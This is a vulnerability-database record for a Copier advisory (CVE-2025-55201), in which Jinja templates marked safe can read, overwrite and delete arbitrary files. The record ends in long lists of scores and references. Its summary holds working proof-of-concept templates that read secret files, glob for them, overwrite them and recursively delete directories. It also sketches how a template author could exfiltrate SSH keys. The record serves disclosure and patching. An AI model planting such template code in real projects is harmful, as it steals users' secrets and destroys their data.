vulnerability_id: VCID-b8mh-jbpu-nubd
aliases:
  - CVE-2025-55201
  - GHSA-3xw7-v6cj-5q8h
summary: |
  Copier's safe template has arbitrary filesystem read/write access
  ### Impact

  Copier's current security model shall restrict filesystem access through Jinja:

  - Files can only be read using `{% include ... %}`, which is limited by Jinja to reading files from the subtree of the local template clone in our case.
  - Files are written in the destination directory according to their counterparts in the template.

  Copier suggests that it's safe to generate a project from a safe template, i.e. one that doesn't use [unsafe](https://copier.readthedocs.io/en/stable/configuring/#unsafe) features like custom Jinja extensions which would require passing the `--UNSAFE,--trust` flag. As it turns out, a safe template can currently read and write arbitrary files because we expose a few `pathlib.Path` objects in the Jinja context which have unconstrained I/O methods. This effectively renders our security model w.r.t. filesystem access useless.

  #### Arbitrary read access

  Imagine, e.g., a malicious template author who creates a template that reads SSH keys or other secrets from well-known locations, perhaps "masks" them with Base64 encoding to reduce detection risk, and hopes for a user to push the generated project to a public location like [github.com](http://github.com/) where the template author can extract the secrets.

  Reproducible example:

  - Read known file:

      ```shell
      echo "s3cr3t" > secret.txt
      mkdir src/
      echo "stolen secret: {{ (_copier_conf.dst_path / '..' / 'secret.txt').resolve().read_text('utf-8') }}" > src/stolen-secret.txt.jinja
      uvx copier copy src/ dst/
      cat dst/stolen-secret.txt
      ```

  - Read unknown file(s) via globbing:

      ```shell
      mkdir secrets/
      echo "s3cr3t #1" > secrets/secret1.txt
      echo "s3cr3t #2" > secrets/secret2.txt
      mkdir src/
      cat <<'EOF' > src/stolen-secrets.txt.jinja
      stolen secrets:
      {% set parent = (_copier_conf.dst_path / '..' / 'secrets').resolve() %}
      {% for f in parent.glob('*.txt') %}
      {{ f }}: {{ f.read_text('utf-8') }}
      {% endfor %}
      EOF
      uvx copier copy src/ dst/
      cat dst/stolen-secrets.txt
      ```

  #### Arbitrary write access

  Imagine, e.g., a malicious template author who creates a template that overwrites or even deletes files to cause havoc.

  Reproducible examples:

  - Overwrite known file:

      ```shell
      echo "s3cr3t" > secret.txt
      mkdir src/
      echo "{{ (_copier_conf.dst_path / '..' / 'secret.txt').resolve().write_text('OVERWRITTEN', 'utf-8') }}" > src/malicious.txt.jinja
      uvx copier copy src/ dst/
      cat secret.txt
      ```

  - Overwrite unknown file(s) via globbing:

      ```shell
      echo "s3cr3t" > secret.txt
      mkdir src/
      cat <<'EOF' > src/malicious.txt.jinja
      {% set parent = (_copier_conf.dst_path / '..').resolve() %}
      {% for f in (parent.glob('*.txt') | list) %}
      {{ f.write_text('OVERWRITTEN', 'utf-8') }}
      {% endfor %}
      EOF
      uvx copier copy src/ dst/
      cat secret.txt
      ```

  - Delete unknown file(s) via globbing:

      ```shell
      echo "s3cr3t" > secret.txt
      mkdir src/
      cat <<'EOF' > src/malicious.txt.jinja
      {% set parent = (_copier_conf.dst_path / '..').resolve() %}
      {% for f in (parent.glob('*.txt') | list) %}
      {{ f.unlink() }}
      {% endfor %}
      EOF
      uvx copier copy src/ dst/
      cat secret.txt
      ```

  - Delete unknown files and directories via tree walking:

      ```shell
      mkdir data
      mkdir data/a
      mkdir data/a/b
      echo "foo" > data/foo.txt
      echo "bar" > data/a/bar.txt
      echo "baz" > data/a/b/baz.txt
      tree data/
      mkdir src/
      cat <<'EOF' > src/malicious.txt.jinja
      {% set parent = (_copier_conf.dst_path / '..' / 'data').resolve() %}
      {% for root, dirs, files in parent.walk(top_down=False) %}
      {% for name in files %}
      {{ (root / name).unlink() }}
      {% endfor %}
      {% for name in dirs %}
      {{ (root / name).rmdir() }}
      {% endfor %}
      {% endfor %}
      EOF
      uvx copier copy src/ dst/
      tree data/
      ```
severities:
  - score: '0.00019'
    scoring_system: epss
    scoring_elements: '0.03279'
    published_at: '2025-08-22 12:55:00+00:00'
    url: https://api.first.org/data/v1/epss?cve=CVE-2025-55201
  - score: '0.00019'
    scoring_system: epss
    scoring_elements: '0.03324'
    published_at: '2025-08-23 12:55:00+00:00'
    url: https://api.first.org/data/v1/epss?cve=CVE-2025-55201
  - score: '0.00025'
    scoring_system: epss
    scoring_elements: '0.05385'
    published_at: '2025-09-09 12:55:00+00:00'
    url: https://api.first.org/data/v1/epss?cve=CVE-2025-55201
  - score: '0.00025'
    scoring_system: epss
    scoring_elements: '0.05396'
    published_at: '2025-09-10 12:55:00+00:00'
    url: https://api.first.org/data/v1/epss?cve=CVE-2025-55201
  - score: '0.00025'
    scoring_system: epss
    scoring_elements: '0.05378'
    published_at: '2025-09-13 12:55:00+00:00'
    url: https://api.first.org/data/v1/epss?cve=CVE-2025-55201
  - score: '0.00025'
    scoring_system: epss
    scoring_elements: '0.05288'
    published_at: '2025-08-24 12:55:00+00:00'
    url: https://api.first.org/data/v1/epss?cve=CVE-2025-55201
  - score: '0.00025'
    scoring_system: epss
    scoring_elements: '0.0549'
    published_at: '2025-09-17 12:55:00+00:00'
    url: https://api.first.org/data/v1/epss?cve=CVE-2025-55201
  - score: '0.00025'
    scoring_system: epss
    scoring_elements: '0.05506'
    published_at: '2025-09-18 12:55:00+00:00'
    url: https://api.first.org/data/v1/epss?cve=CVE-2025-55201
  - score: '0.00025'
    scoring_system: epss
    scoring_elements: '0.05393'
    published_at: '2025-09-14 12:55:00+00:00'
    url: https://api.first.org/data/v1/epss?cve=CVE-2025-55201
  - score: '0.00025'
    scoring_system: epss
    scoring_elements: '0.0544'
    published_at: '2025-09-08 12:55:00+00:00'
    url: https://api.first.org/data/v1/epss?cve=CVE-2025-55201
  - score: '0.00028'
    scoring_system: epss
    scoring_elements: '0.06299'
    published_at: '2025-09-19 12:55:00+00:00'
    url: https://api.first.org/data/v1/epss?cve=CVE-2025-55201
  - score: '0.00028'
    scoring_system: epss
    scoring_elements: '0.06204'
    published_at: '2025-09-22 12:55:00+00:00'
    url: https://api.first.org/data/v1/epss?cve=CVE-2025-55201
  - score: '0.00028'
    scoring_system: epss
    scoring_elements: '0.06214'
    published_at: '2025-09-23 12:55:00+00:00'
    url: https://api.first.org/data/v1/epss?cve=CVE-2025-55201
  - score: '0.00028'
    scoring_system: epss
    scoring_elements: '0.06177'
    published_at: '2025-09-24 12:55:00+00:00'
    url: https://api.first.org/data/v1/epss?cve=CVE-2025-55201
  - score: '0.00028'
    scoring_system: epss
    scoring_elements: '0.06294'
    published_at: '2025-09-27 12:55:00+00:00'
    url: https://api.first.org/data/v1/epss?cve=CVE-2025-55201
  - score: '0.00028'
    scoring_system: epss
    scoring_elements: '0.06292'
    published_at: '2025-09-28 12:55:00+00:00'
    url: https://api.first.org/data/v1/epss?cve=CVE-2025-55201
  - score: '0.00028'
    scoring_system: epss
    scoring_elements: '0.06291'
    published_at: '2025-09-29 12:55:00+00:00'
    url: https://api.first.org/data/v1/epss?cve=CVE-2025-55201
  - score: '0.00028'
    scoring_system: epss
    scoring_elements: '0.06438'
    published_at: '2025-10-01 12:55:00+00:00'
    url: https://api.first.org/data/v1/epss?cve=CVE-2025-55201
  - score: '0.00028'
    scoring_system: epss
    scoring_elements: '0.06416'
    published_at: '2025-10-02 12:55:00+00:00'
    url: https://api.first.org/data/v1/epss?cve=CVE-2025-55201
  - score: '0.00028'
    scoring_system: epss
    scoring_elements: '0.06452'
    published_at: '2025-10-03 12:55:00+00:00'
    url: https://api.first.org/data/v1/epss?cve=CVE-2025-55201
  - score: '0.00028'
    scoring_system: epss
    scoring_elements: '0.06423'
    published_at: '2025-10-06 12:55:00+00:00'
    url: https://api.first.org/data/v1/epss?cve=CVE-2025-55201
  - score: '0.00028'
    scoring_system: epss
    scoring_elements: '0.06445'
    published_at: '2025-10-08 12:55:00+00:00'
    url: https://api.first.org/data/v1/epss?cve=CVE-2025-55201
  - score: '0.00028'
    scoring_system: epss
    scoring_elements: '0.06406'
    published_at: '2025-10-07 12:55:00+00:00'
    url: https://api.first.org/data/v1/epss?cve=CVE-2025-55201
  - score: '0.00028'
    scoring_system: epss
    scoring_elements: '0.06472'
    published_at: '2025-10-24 12:55:00+00:00'
    url: https://api.first.org/data/v1/epss?cve=CVE-2025-55201
  - score: '0.00028'
    scoring_system: epss
    scoring_elements: '0.06491'
    published_at: '2025-10-23 12:55:00+00:00'
    url: https://api.first.org/data/v1/epss?cve=CVE-2025-55201
  - score: '0.00028'
    scoring_system: epss
    scoring_elements: '0.06467'
    published_at: '2025-10-20 12:55:00+00:00'
    url: https://api.first.org/data/v1/epss?cve=CVE-2025-55201
  - score: '0.00028'
    scoring_system: epss
    scoring_elements: '0.06473'
    published_at: '2025-10-19 12:55:00+00:00'
    url: https://api.first.org/data/v1/epss?cve=CVE-2025-55201
  - score: '0.00028'
    scoring_system: epss
    scoring_elements: '0.06493'
    published_at: '2025-10-18 12:55:00+00:00'
    url: https://api.first.org/data/v1/epss?cve=CVE-2025-55201
  - score: '0.00028'
    scoring_system: epss
    scoring_elements: '0.0656'
    published_at: '2025-10-17 12:55:00+00:00'
    url: https://api.first.org/data/v1/epss?cve=CVE-2025-55201
  - score: '0.00028'
    scoring_system: epss
    scoring_elements: '0.06565'
    published_at: '2025-10-16 12:55:00+00:00'
    url: https://api.first.org/data/v1/epss?cve=CVE-2025-55201
  - score: '0.00028'
    scoring_system: epss
    scoring_elements: '0.06549'
    published_at: '2025-10-15 12:55:00+00:00'
    url: https://api.first.org/data/v1/epss?cve=CVE-2025-55201
  - score: '0.00028'
    scoring_system: epss
    scoring_elements: '0.06516'
    published_at: '2025-10-13 12:55:00+00:00'
    url: https://api.first.org/data/v1/epss?cve=CVE-2025-55201
  - score: '0.00029'
    scoring_system: epss
    scoring_elements: '0.07015'
    published_at: '2025-10-28 12:55:00+00:00'
    url: https://api.first.org/data/v1/epss?cve=CVE-2025-55201
  - score: '0.00029'
    scoring_system: epss
    scoring_elements: '0.07033'
    published_at: '2025-10-25 12:55:00+00:00'
    url: https://api.first.org/data/v1/epss?cve=CVE-2025-55201
  - score: '0.00029'
    scoring_system: epss
    scoring_elements: '0.07008'
    published_at: '2025-10-29 12:55:00+00:00'
    url: https://api.first.org/data/v1/epss?cve=CVE-2025-55201
  - score: '0.00029'
    scoring_system: epss
    scoring_elements: '0.07017'
    published_at: '2025-10-30 12:55:00+00:00'
    url: https://api.first.org/data/v1/epss?cve=CVE-2025-55201
  - score: '0.00029'
    scoring_system: epss
    scoring_elements: '0.07066'
    published_at: '2025-11-02 12:55:00+00:00'
    url: https://api.first.org/data/v1/epss?cve=CVE-2025-55201
  - score: '0.00029'
    scoring_system: epss
    scoring_elements: '0.07032'
    published_at: '2025-11-03 12:55:00+00:00'
    url: https://api.first.org/data/v1/epss?cve=CVE-2025-55201
  - score: '0.00034'
    scoring_system: epss
    scoring_elements: '0.09549'
    published_at: '2026-01-11 12:55:00+00:00'
    url: https://api.first.org/data/v1/epss?cve=CVE-2025-55201
  - score: '0.00034'
    scoring_system: epss
    scoring_elements: '0.09567'
    published_at: '2026-01-08 12:55:00+00:00'
    url: https://api.first.org/data/v1/epss?cve=CVE-2025-55201
  - score: HIGH
    scoring_system: cvssv3.1_qr
    scoring_elements:
    published_at: None
    url: https://github.com/advisories/GHSA-3xw7-v6cj-5q8h
  - score: HIGH
    scoring_system: generic_textual
    scoring_elements:
    published_at: None
    url: https://github.com/copier-org/copier
  - score: '8.5'
    scoring_system: cvssv4
    scoring_elements: CVSS:4.0/AV:L/AC:L/AT:N/PR:N/UI:P/VC:H/VI:H/VA:H/SC:N/SI:N/SA:N
    published_at: None
    url: https://github.com/copier-org/copier/commit/3feea3b3ff3c20d80cbb16a2f3b9567ffc5606d1
  - score: HIGH
    scoring_system: generic_textual
    scoring_elements:
    published_at: None
    url: https://github.com/copier-org/copier/commit/3feea3b3ff3c20d80cbb16a2f3b9567ffc5606d1
  - score: Track
    scoring_system: ssvc
    scoring_elements: SSVCv2/E:P/A:N/T:P/P:M/B:A/M:M/D:T/2025-08-18T17:37:40Z/
    published_at: None
    url: https://github.com/copier-org/copier/commit/3feea3b3ff3c20d80cbb16a2f3b9567ffc5606d1
  - score: HIGH
    scoring_system: cvssv3.1_qr
    scoring_elements:
    published_at: None
    url: https://github.com/copier-org/copier/security/advisories/GHSA-3xw7-v6cj-5q8h
  - score: '8.5'
    scoring_system: cvssv4
    scoring_elements: CVSS:4.0/AV:L/AC:L/AT:N/PR:N/UI:P/VC:H/VI:H/VA:H/SC:N/SI:N/SA:N
    published_at: None
    url: https://github.com/copier-org/copier/security/advisories/GHSA-3xw7-v6cj-5q8h
  - score: HIGH
    scoring_system: generic_textual
    scoring_elements:
    published_at: None
    url: https://github.com/copier-org/copier/security/advisories/GHSA-3xw7-v6cj-5q8h
  - score: Track
    scoring_system: ssvc
    scoring_elements: SSVCv2/E:P/A:N/T:P/P:M/B:A/M:M/D:T/2025-08-18T17:37:40Z/
    published_at: None
    url: https://github.com/copier-org/copier/security/advisories/GHSA-3xw7-v6cj-5q8h
  - score: HIGH
    scoring_system: generic_textual
    scoring_elements:
    published_at: None
    url: https://nvd.nist.gov/vuln/detail/CVE-2025-55201
weaknesses:
  - CWE-22
  - CWE-1035
  - CWE-937
references:
  - url: https://api.first.org/data/v1/epss?cve=CVE-2025-55201
    reference_type:
    reference_id:
  - url: https://github.com/copier-org/copier
    reference_type:
    reference_id:
  - url: https://github.com/copier-org/copier/commit/3feea3b3ff3c20d80cbb16a2f3b9567ffc5606d1
    reference_type:
    reference_id:
  - url: https://github.com/copier-org/copier/security/advisories/GHSA-3xw7-v6cj-5q8h
    reference_type:
    reference_id:
  - url: https://nvd.nist.gov/vuln/detail/CVE-2025-55201
    reference_type:
    reference_id:
  - url: https://github.com/advisories/GHSA-3xw7-v6cj-5q8h
    reference_type:
    reference_id: GHSA-3xw7-v6cj-5q8h
